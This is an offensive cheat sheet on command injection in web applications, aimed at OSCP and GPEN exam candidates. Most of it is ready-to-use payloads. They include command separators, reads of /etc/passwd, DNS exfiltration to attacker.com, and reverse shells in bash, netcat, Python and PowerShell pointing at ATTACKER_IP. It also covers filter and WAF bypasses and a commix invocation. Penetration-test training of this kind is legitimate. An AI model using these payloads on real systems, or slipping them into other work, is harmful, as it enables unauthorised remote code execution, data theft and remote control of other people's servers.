# Command Injection Cheat Sheet (Web Applications) – OSCP / GPEN

This cheat sheet provides a **structured methodology for identifying and exploiting command injection vulnerabilities through web applications** during **OSCP and GPEN exams**.

Core methodology:

```
Identify Input → Test for Injection → Confirm Execution → Bypass Filters → Execute Commands → Gain Shell
```

Command injection occurs when **user input is passed to system commands without proper sanitization**.

Example vulnerable code:

```php
system("ping " . $_GET['ip']);
```

If input is not sanitized, attackers can inject additional commands.

---

# 1. Identify Injection Points

Look for functionality that interacts with the OS:

```
Ping tools
Traceroute
File upload processing
DNS lookup
System utilities
Image processing
Backup scripts
```

Example parameter:

```
http://target.com/ping.php?ip=127.0.0.1
```

---

# 2. Basic Injection Tests

Test command separators.

Payloads:

```
127.0.0.1;id
127.0.0.1&&id
127.0.0.1|id
127.0.0.1||id
```

If output contains:

```
uid=1000
```

Then command execution is confirmed.

---

# 3. Command Separators

| Operator | Description |
|--------|-------------|
| `;` | Execute next command |
| `&&` | Execute if previous succeeds |
| `||` | Execute if previous fails |
| `|` | Pipe output |
| `&` | Run command in background |

Example:

```
127.0.0.1;whoami
```

---

# 4. OS Detection

Check operating system.

Linux payload:

```
;id
```

Windows payload:

```
& whoami
```

---

# 5. Basic Command Execution

Test simple commands.

Linux:

```
;whoami
;id
;uname -a
```

Windows:

```
& whoami
& dir
```

---

# 6. Directory Listing

Linux:

```
;ls
;ls -la
```

Windows:

```
& dir
```

---

# 7. File Read

Linux:

```
;cat /etc/passwd
```

Windows:

```
& type C:\Windows\win.ini
```

---

# 8. Command Injection with Pipes

Example:

```
127.0.0.1|id
```

---

# 9. Command Injection with Backticks

Backticks execute commands.

Example:

```
127.0.0.1`id`
```

---

# 10. Command Injection with $()

Example:

```
127.0.0.1$(id)
```

---

# 11. Blind Command Injection

Occurs when command output not visible.

Example:

```
127.0.0.1;ping -c 5 attacker.com
```

Check network interaction.

---

# 12. Time-Based Blind Injection

Example:

```
127.0.0.1;sleep 5
```

If response delayed → injection exists.

---

# 13. DNS Exfiltration

Send data through DNS.

Example:

```
;nslookup $(whoami).attacker.com
```

---

# 14. Output Redirection

Save output to file.

Example:

```
;id > /var/www/html/output.txt
```

Access file through browser.

---

# 15. Reverse Shell

Linux reverse shell example:

```
;bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1
```

Start listener:

```bash
nc -lvnp 4444
```

---

# 16. Netcat Reverse Shell

Example:

```
;nc ATTACKER_IP 4444 -e /bin/bash
```

---

# 17. Python Reverse Shell

Example:

```
;python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("ATTACKER_IP",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh"])'
```

---

# 18. Bash Reverse Shell

Example:

```
;bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'
```

---

# 19. Windows Reverse Shell

PowerShell example:

```
powershell -c "$client = New-Object System.Net.Sockets.TCPClient('ATTACKER_IP',4444);$stream = $client.GetStream();..."
```

---

# 20. Filter Bypass Techniques

Applications may block characters.

Common blocked characters:

```
;
|
&
$
```

---

# 21. Encoding Bypass

URL encoding.

Example:

```
%3B = ;
```

Example payload:

```
127.0.0.1%3Bid
```

---

# 22. Space Bypass

Replace spaces.

Examples:

```
${IFS}
```

Example:

```
127.0.0.1;cat${IFS}/etc/passwd
```

---

# 23. Base64 Bypass

Encode command.

Example:

```
echo "id" | base64
```

Execute:

```
echo aWQ= | base64 -d | bash
```

---

# 24. Command Substitution

Use alternative syntax.

Example:

```
$(whoami)
```

---

# 25. WAF Bypass

Use comments or concatenation.

Example:

```
w'h'o'am'i
```

---

# 26. Exploiting Image Upload

If server processes files using system commands.

Example:

```
filename="image.jpg;id"
```

---

# 27. Exploiting Backup Scripts

Example parameter:

```
backup=site
```

Payload:

```
backup=site;id
```

---

# 28. Command Injection Workflow

```
1. Identify input field
2. Test command separators
3. Confirm command execution
4. Identify OS
5. Execute system commands
6. Escalate to reverse shell
```

---

# 29. Tools for Testing

Useful tools:

```
Burp Suite
Commix
OWASP ZAP
```

Example:

```bash
commix --url="http://target.com/page.php?ip=127.0.0.1"
```

---

# 30. Quick Payload List

Basic tests:

```
;id
&&id
|id
||id
```

Reverse shell:

```
;bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1
```

File read:

```
;cat /etc/passwd
```

---

# 31. Common Command Injection Scenarios in Exams

Typical OSCP/GPEN vulnerabilities:

```
Ping tools
Traceroute utilities
System monitoring tools
File processing scripts
```

---

# 32. Final Advice

Command injection is about **identifying where the application interacts with the OS**.

Always ask:

```
Does this feature run a system command?
Can I append another command?
```

Once command execution is achieved, **pivot to reverse shell immediately**.
